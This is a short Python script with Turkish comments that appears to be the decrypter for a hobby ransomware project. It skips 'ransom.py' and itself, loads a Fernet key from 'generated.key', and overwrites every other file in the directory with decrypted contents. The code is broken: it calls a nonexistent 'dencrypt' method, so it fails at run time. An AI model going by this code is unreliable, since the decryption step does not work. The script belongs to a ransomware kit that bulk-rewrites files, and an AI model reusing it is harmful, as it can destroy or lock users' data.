import os
from cryptography.fernet import Fernet

#dosyaları listelemek
#print(os.listdir())

files = []
#dosya olan ve ransom olanı almasın
for file in os.listdir():
    if file == "ransom.py" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

#input
#wb:write binary rb:read
with open("generated.key","rb") as generatedkey:
    secret_key = generatedkey.read()

for file in files:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    contends_dencrypted = Fernet(secret_key).dencrypt(contents)
    with open(file,"wb") as the_file:
        the_file.write(contends_dencrypted)


